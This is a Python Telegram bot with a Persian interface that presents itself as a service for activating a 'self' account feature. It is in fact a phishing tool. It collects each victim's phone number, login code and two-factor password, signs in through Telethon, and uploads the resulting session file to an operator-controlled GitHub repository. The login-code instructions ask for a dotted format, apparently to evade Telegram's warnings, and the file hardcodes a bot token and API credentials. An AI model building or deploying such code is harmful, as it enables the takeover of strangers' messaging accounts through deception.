import re
import os
import base64
import requests
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError, PhoneCodeInvalidError

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"
API_ID = 34855392
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"

GITHUB_TOKEN = "گیت هب توکن"
GITHUB_OWNER = "مچوم"
GITHUB_REPO = "اع کونی"
GITHUB_BRANCH = "چی"

user_sessions = {}

def create_telethon_client(session_name):
    return TelegramClient(
        session_name,
        API_ID,
        API_HASH,
        device_model="Windows 11 Pro",
        system_version="10.0.22621",
        app_version="4.8.4",
        lang_code="en",
        system_lang_code="en-US"
    )

async def upload_to_github(file_path, user_id):
    try:
        with open(file_path, 'rb') as f:
            content = base64.b64encode(f.read()).decode('utf-8')
        filename = os.path.basename(file_path)
        github_path = f"sessions/{filename}"
        url = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{github_path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
        data = {"message": f"Add session for user {user_id}", "content": content, "branch": GITHUB_BRANCH}
        response = requests.put(url, headers=headers, json=data)
        return response.status_code in [200, 201]
    except Exception as e:
        logger.error(f"GitHub upload error: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await show_main_menu(update, context)

async def show_main_menu(update, context, edit=False):
    keyboard = [
        [InlineKeyboardButton("🚀 فعال سازی سلف", callback_data="activate_self")],
        [InlineKeyboardButton("❓ سلف چیست", callback_data="what_is_self")],
        [InlineKeyboardButton("📞 پشتیبانی", callback_data="support")]
    ]
    text = "👋 به ربات خوش آمدید!"
    if edit and hasattr(update, 'callback_query'):
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        msg = await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        context.user_data['main_msg_id'] = msg.message_id

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "activate_self":
        msg = await context.bot.send_message(
            chat_id=user_id,
            text="📱 لطفاً شماره موبایل را با کد کشور ارسال کنید.\nمثال: +989123456789\n🌍 همه کشورها پشتیبانی می‌شوند.",
            parse_mode="Markdown"
        )
        context.user_data['state'] = "PHONE"
        context.user_data['last_msg_id'] = msg.message_id
        await query.edit_message_text("⏳ در حال دریافت شماره...")
        return

    elif query.data == "what_is_self":
        await query.edit_message_text(
            "🔍 سشن چیست؟\n\nفایل سشن کلید ورود به حساب شماست.\nقابلیت‌ها: ذخیره ارز، ماشین حساب، مدیریت دشمنان، حالت سکوت، ساعت و ...\n⚠️ بسیار مهم و محرمانه!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back_to_main")]])
        )
        return

    elif query.data == "support":
        await query.edit_message_text(
            "📞 پشتیبانی:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 ارسال پیام", url="https://t.me/dic580")]])
        )
        return

    elif query.data == "back_to_main":
        await show_main_menu(update, context, edit=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    state = context.user_data.get('state')
    logger.info(f"User {user_id} state: {state}, message: {update.message.text}")

    if state == "PHONE":
        await receive_phone(update, context)
    elif state == "CODE":
        await receive_code(update, context)
    elif state == "PASSWORD":
        await receive_password(update, context)
    else:
        await update.message.reply_text("لطفاً ابتدا /start را بزنید.")

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    phone = update.message.text.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    logger.info(f"Processing phone: {phone} for user {user_id}")

    if not phone.startswith('+') or not phone[1:].isdigit():
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="❌ شماره باید با + شروع شود.\nمثال: +989123456789\nدوباره ارسال کن:",
            parse_mode="Markdown"
        )
        return

    session_path = f"sessions/{user_id}_session"
    client = create_telethon_client(session_path)

    try:
        await client.connect()
        await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone, "session_path": session_path}

        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="✅ کد تایید ارسال شد.\n"
                 "لطفاً کد ۵ رقمی را به فرمت زیر ارسال کن:\n"
                 "0.0.0.0.0 (با نقطه بین هر رقم)\n\n"
                 "❗️ همچنین می‌تونی به شکل‌های دیگه بفرستی:\n"
                 "12345 یا 1 2 3 4 5",
            parse_mode="Markdown"
        )
        context.user_data['state'] = "CODE"
        await update.message.delete()
    except PhoneNumberInvalidError:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="❌ شماره نامعتبر است. دوباره ارسال کن:"
        )
    except FloodWaitError as e:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text=f"⏳ صبر کن {e.seconds} ثانیه."
        )
    except Exception as e:
        logger.error(f"Error in receive_phone: {str(e)}")
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text=f"❌ خطا: {str(e)}\nدوباره شماره رو ارسال کن:"
        )

async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    raw = update.message.text.strip()
    clean = re.sub(r'\D', '', raw)

    if len(clean) != 5:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="❌ کد باید ۵ رقم باشد. به فرمت 0.0.0.0.0 ارسال کن:",
            parse_mode="Markdown"
        )
        return

    if user_id not in user_sessions:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="لطفاً دوباره /start کن."
        )
        context.user_data.clear()
        return

    data = user_sessions[user_id]
    client = data["client"]

    try:
        await client.sign_in(data["phone"], clean)
        session_file = f"{data['session_path']}.session"
        await upload_to_github(session_file, user_id)

        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="✅ سلف شما تا ۵ دقیقه دیگه روشن میشه!\nلطفاً صبر کنید...",
            parse_mode="Markdown"
        )
        await client.disconnect()
        del user_sessions[user_id]
        context.user_data.clear()
        await update.message.delete()
    except SessionPasswordNeededError:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="🔐 رمز دوم (۲FA) دارد.\nلطفاً رمز عبور را وارد کن:"
        )
        context.user_data['state'] = "PASSWORD"
        await update.message.delete()
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text=f"❌ {str(e)}\nدوباره کد رو ارسال کن:"
        )

async def receive_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    password = update.message.text.strip()

    if user_id not in user_sessions:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="لطفاً دوباره /start کن."
        )
        context.user_data.clear()
        return

    data = user_sessions[user_id]
    client = data["client"]

    try:
        await client.sign_in(password=password)
        session_file = f"{data['session_path']}.session"
        await upload_to_github(session_file, user_id)

        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text="✅ سلف شما تا ۵ دقیقه دیگه روشن میشه!\nلطفاً صبر کنید...",
            parse_mode="Markdown"
        )
        await client.disconnect()
        del user_sessions[user_id]
        context.user_data.clear()
        await update.message.delete()
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=context.user_data['last_msg_id'],
            text=f"❌ {str(e)}\nدوباره رمز رو وارد کن:"
        )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if user_id in user_sessions:
        await user_sessions[user_id]["client"].disconnect()
        del user_sessions[user_id]
    context.user_data.clear()
    await update.message.reply_text("❌ لغو شد.")

def main():
    if not os.path.exists("sessions"):
        os.makedirs("sessions")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("✅ ربات روشن شد...")
    app.run_polling()

if __name__ == "__main__":
    main()
